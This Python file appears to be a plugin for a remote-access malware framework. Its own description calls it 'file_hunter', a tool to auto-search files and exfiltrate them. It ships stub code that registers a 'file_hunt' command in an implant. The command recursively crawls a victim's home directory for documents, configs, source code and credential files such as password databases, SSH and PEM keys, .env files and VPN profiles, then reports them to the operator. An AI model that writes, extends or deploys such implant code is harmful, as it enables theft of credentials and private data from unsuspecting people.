PLUGIN = {"name": "file_hunter", "desc": "Auto-search files by extension/keyword and exfiltrate", "deps": [], "size": 2.5}

STUB_CODE = r"""
import os, base64

_HUNT_TARGETS = {
    "documents": [".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".txt", ".rtf", ".csv"],
    "credentials": [".kdbx", ".kdb", ".key", ".pem", ".ppk", ".id_rsa", ".pgp", ".gpg", ".ovpn"],
    "configs": [".env", ".config", ".conf", ".ini", ".cfg", ".yml", ".yaml", ".xml", ".json"],
    "code": [".py", ".js", ".ts", ".java", ".php", ".rb", ".go", ".rs", ".c", ".cpp", ".cs"],
    "images": [".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".raw", ".psd"],
    "archives": [".zip", ".rar", ".7z", ".tar", ".gz", ".bz2"],
}

def _hunt_files(root_dir, extensions, max_results=50, max_depth=4):
    found = []
    root_dir = os.path.abspath(root_dir)
    try:
        for item in os.listdir(root_dir):
            if len(found) >= max_results: break
            item_path = os.path.join(root_dir, item)
            try:
                if os.path.isfile(item_path):
                    ext = os.path.splitext(item)[1].lower()
                    if ext in extensions:
                        sz = os.path.getsize(item_path)
                        found.append({"path": item_path, "size": sz, "ext": ext})
                elif os.path.isdir(item_path) and max_depth > 0:
                    try:
                        found.extend(_hunt_files(item_path, extensions, max_results - len(found), max_depth - 1))
                    except: pass
            except: pass
    except: pass
    return found

def _cmd_file_hunt(m):
    try:
        root = m.get("path", os.path.expanduser("~"))
        ext = m.get("ext", "")
        cat = m.get("category", "")
        max_results = min(m.get("max", 50), 200)
        max_depth = min(m.get("depth", 3), 6)

        extensions = set()
        if ext:
            for e in ext.split(","):
                e = e.strip().lower()
                if not e.startswith("."): e = "." + e
                extensions.add(e)
        if cat and cat in _HUNT_TARGETS:
            extensions.update(_HUNT_TARGETS[cat])
        if not extensions:
            extensions = set([".pdf", ".doc", ".docx", ".xls", ".xlsx"])
        extensions = list(extensions)

        results = _hunt_files(root, extensions, max_results, max_depth)
        if not results:
            return {"output": f"[!] No files found matching {extensions[:5]} in {root}"}

        results.sort(key=lambda x: -x["size"])
        lines = [f"[+] Found {len(results)} files:"]
        for r in results[:30]:
            lines.append(f"  {r['ext']:8s} {r['size']:>10,} B  {r['path'][:120]}")
        if len(results) > 30:
            lines.append(f"  ... and {len(results)-30} more")
        return {"output": "\n".join(lines), "files": results}
    except Exception as e: return {"output": f"[!] File hunt error: {e}"}

_CMDS["file_hunt"] = _cmd_file_hunt
"""

def get_commands():
    return {"file_hunt": "_cmd_file_hunt"}
